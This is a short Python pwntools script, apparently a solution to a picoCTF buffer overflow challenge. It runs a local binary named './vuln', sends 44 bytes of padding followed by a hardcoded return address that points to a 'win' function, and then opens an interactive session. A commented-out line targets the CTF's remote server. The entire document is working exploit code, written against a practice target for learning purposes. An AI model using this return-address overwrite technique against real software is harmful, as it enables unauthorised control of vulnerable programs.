import pwn

# p = pwn.remote("saturn.picoctf.net", 57164)
p = pwn.process('./vuln')

junk = b"A" * (36 + 8) 
win_address = b"\xf6\x91\x04\x08"
new_line = b"\n"
pyload = [
    junk,
    win_address,
    new_line
]
p.readuntil("Please enter your string:")

p.sendline(b"".join(pyload))
print(p.readline())
p.interactive()
